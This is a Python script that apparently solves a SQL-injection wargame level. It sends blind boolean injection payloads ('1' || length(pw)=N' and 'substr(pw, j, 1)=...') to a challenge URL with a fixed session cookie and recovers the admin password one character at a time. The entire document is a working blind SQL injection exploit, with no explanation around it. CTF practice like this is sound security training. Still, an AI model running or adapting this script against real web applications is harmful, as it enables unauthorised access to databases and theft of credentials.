import requests

flag = ""
length = 0

url = "https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
session = dict(PHPSESSID = "erpattdomn7scjpvvrsbps4l21")

print ("[+] Start")

print ("[+] Find length of the password")

for i in range(0, 20):
   try:
      query = url + "1' || length(pw)=" + str(i) + "%23"
      r = requests.post(query, cookies=session)
   except:
      print ("[-] Error occur")
      continue

   if 'Hello admin' in r.text:
      length = i
      break

print ("[+] Found length : ", length)

print ("[+] Find password")

for j in range(1, length + 1):
   for i in range(48, 128):
      try:
         query = url + "1' || substr(pw, " + str(j) + ", 1)='" + chr(i)
         r = requests.post(query, cookies=session)
      except:
         print ("[-] Error occur")
         continue

      if 'Hello admin' in r.text:
         flag += chr(i)
         print ("[+] Found " + str(j), ":", flag)
         break

print ("[+] Found password : ", flag)
print ("[+] End")
